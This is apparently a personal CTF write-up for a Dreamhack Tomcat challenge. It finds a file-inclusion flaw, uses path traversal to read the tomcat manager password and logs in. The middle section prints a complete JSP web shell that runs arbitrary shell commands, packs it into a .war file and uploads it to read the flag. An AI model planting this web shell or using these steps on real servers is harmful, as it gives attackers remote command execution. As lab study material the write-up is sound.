---
created: 2026-05-10
tags:
  - note
  - journal
  - cyberStuff
  - dreamhack
title: manager-tomcat
draft: false
date:
subiect:
dificultate: 1
amuca: false
link:
lastmod: 2026-05-10T10:52:51.066Z
---
access the site first time:\
![](/images/blog-ul-meu/static/Pasted%20image%2020260510064219.png)\
look at the image source\
![](/images/blog-ul-meu/static/Pasted%20image%2020260510064234.png)\
looks like LFI , do some path traversal in burp and get the pass of user tomcat\
![](/images/blog-ul-meu/static/Pasted%20image%2020260510060750.png)\
log in with the password at /manager\
![](/images/blog-ul-meu/static/Pasted%20image%2020260510065249.png)\
inside we get a file upload menu , the file need to be in .war format

```
create shell :
```

```

nano shell.jsp

COPY-PSTE THIS

<%@ page import="java.io.*" %>
<%
    String cmd = request.getParameter("cmd");
    if (cmd != null) {
        Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", cmd});
        BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
        String line;
        while ((line = reader.readLine()) != null) {
            out.println(line + "<br>");
        }
    }
%>

SAVE EXIT 

zip exploit.war shell.jsp A
```

now upload exploit.war and access YOUR-SITE/exploit/shell.jsp?cmd=/flag\
![](/images/blog-ul-meu/static/Pasted%20image%2020260510064024.png)
